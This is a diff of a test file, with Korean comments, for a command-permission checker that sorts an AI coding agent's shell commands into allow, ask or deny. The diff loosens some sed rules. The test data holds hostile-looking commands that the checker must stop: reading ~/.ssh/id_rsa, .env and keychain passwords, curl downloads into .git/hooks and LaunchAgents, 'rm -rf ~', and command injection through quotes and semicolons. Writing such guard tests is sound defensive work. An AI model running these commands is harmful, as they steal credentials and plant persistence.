@@ -78,7 +78,7 @@ assert.strictEqual(A("curl http://127.0.0.1:59720/api/crew/board -d x"), "deny",
 assert.strictEqual(A("npm test 2>&1 | tail -5"), "allow", "2>&1은 나누지 않음");
 assert.strictEqual(A("CI=1 npx vitest run"), "allow", "허용 env + 아는 npx");
 assert.strictEqual(A('git commit -m "docs: explain git push"'), "allow", "메시지 속 push 글자는 무관(오탐 방지)");
-assert.strictEqual(A("sed -i '' s/a/b/ src/x.ts"), "ask", "sed -i 안쪽");
+assert.strictEqual(A("sed -i '' s/a/b/ src/x.ts"), "allow", "sed -i 안쪽 치환은 통과(앱 확인)");
 assert.strictEqual(A("sed -n 1,5p /etc/hosts"), "ask", "sed 읽기");
 assert.strictEqual(A("cp a.ts b.ts && mv b.ts c.ts"), "allow", "안쪽 복사·이동");
 // Codex apply_patch — 경로가 안쪽일 때만
@@ -90,8 +90,8 @@ assert.strictEqual(decide("mcp__Github__merge_pull_request", {}, W), "ask", "MCP
 
 assert.strictEqual(A("git checkout -b feat/x"), "allow", "새 브랜치는 그대로");
 assert.strictEqual(A('git commit -m "say \\"hi\\""'), "allow", "큰따옴표 안 \\\" (오탐 방지)");
-assert.strictEqual(A("sed -n '/window/p' src/a.ts"), "ask", "/w로 시작하는 정규식 (오탐 방지)");
-assert.strictEqual(A("sed -i '' 's/a/b/' src/x.ts"), "ask", "macOS -i '' 안쪽");
+assert.strictEqual(A("sed -n '/window/p' src/a.ts"), "allow", "/w로 시작하는 정규식은 범위 출력(쓰기 아님)");
+assert.strictEqual(A("sed -i '' 's/a/b/' src/x.ts"), "allow", "macOS -i '' 안쪽 치환(앱 확인)");
 assert.strictEqual(A("node --test"), "allow");
 assert.strictEqual(A("python3 -m pytest -q"), "allow");
 assert.strictEqual(A("node scripts/check.mjs"), "allow", "스크립트 파일 실행(작업 폴더 코드 신뢰 — 샌드박스 이슈)");
@@ -225,8 +225,8 @@ assert.strictEqual(A('git commit -m "한글 커밋 메시지"'), "allow", "한�
   assert.strictEqual(B("sed -n 'w/Users/x/.zshrc' README.md"), "ask", "sed w 빈칸 없이");
   assert.strictEqual(B("sed 's/^/x/w/tmp/out' README.md"), "ask", "sed s///w 빈칸 없이");
   assert.strictEqual(B("sed -n w/tmp/out README.md"), "ask", "따옴표 없는 sed 스크립트");
-  assert.strictEqual(B("sed -n 's/a/b/p' README.md"), "ask", "평범한 sed");
-  assert.strictEqual(B("sed -i 's/x/world/' README.md"), "ask", "치환 내용이 w로 시작");
+  assert.strictEqual(B("sed -n 's/a/b/p' README.md"), "allow", "평범한 sed 치환 출력(앱 확인)");
+  assert.strictEqual(B("sed -i 's/x/world/' README.md"), "allow", "치환 내용이 w로 시작 — 플래그 아님");
   assert.strictEqual(B("sed -n '/re/w /tmp/out' README.md"), "ask", "주소 뒤 w");
   assert.strictEqual(B("cd && echo x > .zshrc"), "ask", "인자 없는 cd = 홈");
   assert.strictEqual(B("cd - && ls"), "ask", "cd -");
@@ -237,8 +237,8 @@ assert.strictEqual(A('git commit -m "한글 커밋 메시지"'), "allow", "한�
   // 4차 리뷰 — sed 허락 목록·cd 옵션·glob 시험
   for (const c of ["sed -n '/x/wout.txt' README.md", "sed -n '\\%x%w /tmp/o' README.md", "sed -n '1{w /tmp/zz\n}' README.md", "sed '/x/e git push' README.md", "sed -f evil.sed README.md", "sed 's/a/b/;w /tmp/x' f", "sed -e 's/a/b/' -e 'w /tmp/x' f", "sed 'r /etc/passwd' f"])
     assert.strictEqual(B(c), "ask", `sed 허락 목록 밖: ${c}`);
-  for (const c of ["sed -i 's/x/ world/' README.md", "sed -n 's/a/b/p' web/index.ts", "sed -n p f", "cat f | sed 's/a/b/'", "s\\\ned -n 's/a/b/w /tmp/x' f"])
-    assert.strictEqual(B(c), "ask", `sed는 항상 사람(#1159 리뷰 5): ${c}`);
+  for (const c of ["sed -i 's/x/ world/' README.md", "sed -n 's/a/b/p' web/index.ts", "cat f | sed 's/a/b/'"]) assert.strictEqual(B(c), "allow", `sed 치환·출력(앱 확인): ${c}`);
+  for (const c of ["sed -n p f", "s\\\ned -n 's/a/b/w /tmp/x' f"]) assert.strictEqual(B(c), "ask", `sed 그 밖은 사람(#1159 리뷰 5): ${c}`);
   for (const c of ["cd -P && echo x >> .zprofile", "cd -- && echo x >> .zprofile"]) assert.strictEqual(B(c), "ask", `목적지 없는 cd: ${c}`);
   assert.strictEqual(B("cd -P packages/x && npm test"), "allow", "옵션 + 목적지 있는 cd");
   for (const g of ["*.env", "{.env,x}", ".e[n]v", "id_*", "*.npmrc", "**/*.pem"]) assert.strictEqual(decide("Grep", { pattern: "x", glob: g }, WH), "ask", `Grep glob: ${g}`);
@@ -308,7 +308,7 @@ assert.strictEqual(A('git commit -m "한글 커밋 메시지"'), "allow", "한�
   assert.strictEqual(P("security find-generic-password -w", ALL), "ask");
   assert.strictEqual(P("osascript -e 'x'", ALL), "ask");
   assert.strictEqual(P("crontab x", ALL), "ask");
-  assert.strictEqual(P("sed -i '' s/x/y/ a.txt", ALL), "ask", "sed는 원래 항상 사람");
+  assert.strictEqual(P("sed -i '' s/x/y/ a.txt", ALL), "allow", "sed 치환은 통과(앱 확인)");
   assert.strictEqual(P("wget -O ~/Library/LaunchAgents/x.plist https://x", ALL), "ask", "다운로드를 밖에 저장");
   assert.strictEqual(P("curl -o .git/hooks/post-checkout https://x", ALL), "ask", "보호 폴더에 저장");
   assert.strictEqual(P("curl --output=/tmp/x https://x", ALL), "ask");
@@ -348,9 +348,16 @@ assert.strictEqual(A('git commit -m "한글 커밋 메시지"'), "allow", "한�
   // 앱 확인 — 크루가 gh issue list로 멈춤 → gh 읽기는 인터넷 항목, 쓰기는 사람
   for (const c of ["gh issue list --state all --limit 15", "gh pr view 3", "gh pr diff 3", "gh run list", "gh repo view", "gh issue view 8 --comments", "gh pr list --json number --jq .number"]) assert.strictEqual(P(c, ALL), "allow", c);
   assert.strictEqual(P("gh issue list", DEF), "ask", "인터넷 꺼져 있으면 묻기");
+  // 앱 확인(크루 기록 재생 44→9건) — heredoc 본문 // 주석, sed 치환·범위, git merge-base·@{u}, grep 정규식 .*, 같은 레포 다른 크루 폴더 cd, Skill
+  { const CW = "/Users/u/.nunopi/worktrees/abc/1234";
+    for (const c of ["cat > a.dart <<'EOF'\n// 주석\n/// x\nEOF", "sed -i '' 's/a/b/g' t.dart", "sed -i \"s/tap(find.text('x'));\\n//\" t.dart", "sed -n '/^dep/,/^dev/p' pubspec.yaml", "sed -n 's/a/b/p' t",
+      "git merge-base main x", "git merge-tree --write-tree HEAD x", "git rev-parse --abbrev-ref @{u}", "git log HEAD@{1} -1", "grep -rn x lib | grep -v \"^lib/.*//\"", "cd /Users/u/.nunopi/worktrees/abc/9999 && git status"]) assert.strictEqual(decide("Bash", { command: c }, CW, ALL), "allow", c);
+    for (const c of ["cat > a.md <<'EOF'\nsee ~/.ssh/id_rsa\nEOF", "echo \"<<EOF\"\ncat //\nEOF", "sed -i 's/a/b/w x' t", "sed -i 's/a/b/e' t", "sed -i 's/a/b/' ~/.zshrc", "sed -i 's/a/b/' .git/hooks/x", "sed 's/a/b/;w x' t", "sed -i \"s/$x/b/\" t", "sed -i.bak s/a/b/ t", "sed -e 's/a/b/' -e 'w x' t", "sed -i 's/a/b/'", "sed -n 's/a/b/p' t; sed -i 's/a/b/;w x' t",
+      "git merge x", "cat .env*", "cat \".e\"nv*", "cd /Users/u/.nunopi/worktrees/other/9 && ls", "cd /Users/u/.nunopi/worktrees/abc/../x && ls", "cd ~ && ls"]) assert.notStrictEqual(decide("Bash", { command: c }, CW, ALL), "allow", c);
+    assert.strictEqual(decide("Skill", { skill: "x" }, CW, {}), "allow"); }
   // 앱 확인 — ( … ) 서브셸로 감싼 명령도 안의 명령으로 판정(<( … )는 여전히 묻기)
   for (const c of ["cat a.dart | head -80; (flutter pub add record 2>&1 | tail -8); git diff --stat", "(cd sub && npm test)", "grep -n \"Microphone\" -A1 ios/Runner/Info.plist; sed -n 125,135p README.md", "sed -n '10,$p' a.dart | head"]) assert.strictEqual(P(c, ALL), "allow", c);
-  for (const c of ["(git push)", "(cd /etc && ls)", "(rm -rf ~)", "(curl -o ~/x https://e)", "ls;curl -o ~/x https://e", "curl \"a;b\" -o ~/y https://e", "curl 'x&y' -o ~/e https://e", "curl \"x)\" -o ~/y https://e", "curl \"x;\" -o .git/hooks/pre-commit https://e", "wget \"a;\" -O ~/y https://e", "wget \"a;\" https://e.com/.mcp.json", "curl $'a;' -o ~/y https://e", "curl \\; -o ~/y https://e", "curl \\| -o ~/y https://e", "curl \\( -o ~/y https://e", "wget \\; -O ~/y https://e", "curl 2>&1 -o ~/y https://e", "curl >&2 -o ~/y https://e", "wget 2>&1 -O ~/y https://e", "curl &>/dev/null -o ~/y https://e", "curl $'a\\'b;' -o ~/y https://e", "curl $'a\\';' -o ~/y https://e", "curl $'a\\'; b' -o ~/y https://e", "ls&&curl -o ~/x https://e", "diff a <(curl -o ~/x https://e)", "x=(sudo ls)", "(sed -i s/a/b/ f)", "sed -n 1p a w ~/x", "sed -n 1w~/x a", "sed -n -i 1p a", "sed -n 1p a; sed -i s/a/b/ a", "sed -n 1p ~/.ssh/id_rsa", "sed -n \"1p;w x\" a", "sed -n '1p' a; sed -n '1p;w x' b", "sed -n 1$p a", "sed -n 1p ../x", "echo {a,b}", "f(){ ls; }"]) assert.notStrictEqual(P(c, ALL), "allow", c);
+  for (const c of ["(git push)", "(cd /etc && ls)", "(rm -rf ~)", "(curl -o ~/x https://e)", "ls;curl -o ~/x https://e", "curl \"a;b\" -o ~/y https://e", "curl 'x&y' -o ~/e https://e", "curl \"x)\" -o ~/y https://e", "curl \"x;\" -o .git/hooks/pre-commit https://e", "wget \"a;\" -O ~/y https://e", "wget \"a;\" https://e.com/.mcp.json", "curl $'a;' -o ~/y https://e", "curl \\; -o ~/y https://e", "curl \\| -o ~/y https://e", "curl \\( -o ~/y https://e", "wget \\; -O ~/y https://e", "curl 2>&1 -o ~/y https://e", "curl >&2 -o ~/y https://e", "wget 2>&1 -O ~/y https://e", "curl &>/dev/null -o ~/y https://e", "curl $'a\\'b;' -o ~/y https://e", "curl $'a\\';' -o ~/y https://e", "curl $'a\\'; b' -o ~/y https://e", "ls&&curl -o ~/x https://e", "diff a <(curl -o ~/x https://e)", "x=(sudo ls)", "(sed -i s/a/b/w ~/x f)", "sed -n 1p a w ~/x", "sed -n 1w~/x a", "sed -n -i 1p ~/x", "sed -n 1p a; sed -i s/a/b/e a", "sed -n 1p ~/.ssh/id_rsa", "sed -n \"1p;w x\" a", "sed -n '1p' a; sed -n '1p;w x' b", "sed -n 1$p a", "sed -n 1p ../x", "echo {a,b}", "f(){ ls; }"]) assert.notStrictEqual(P(c, ALL), "allow", c);
   for (const c of ["gh pr merge 1", "gh pr create", "gh api repos/x", "gh auth token", "gh issue close 3", "gh pr view 3 --web", "gh pr view 3 --web=true", "gh issue view 1 --template @n.txt", "gh issue view 1 --template=\"@n.txt\""]) assert.strictEqual(P(c, ALL), "ask", c);
   // 기본 인자 = 전부 묻기(예전과 같음)
   assert.strictEqual(P("flutter test", {}), "ask");
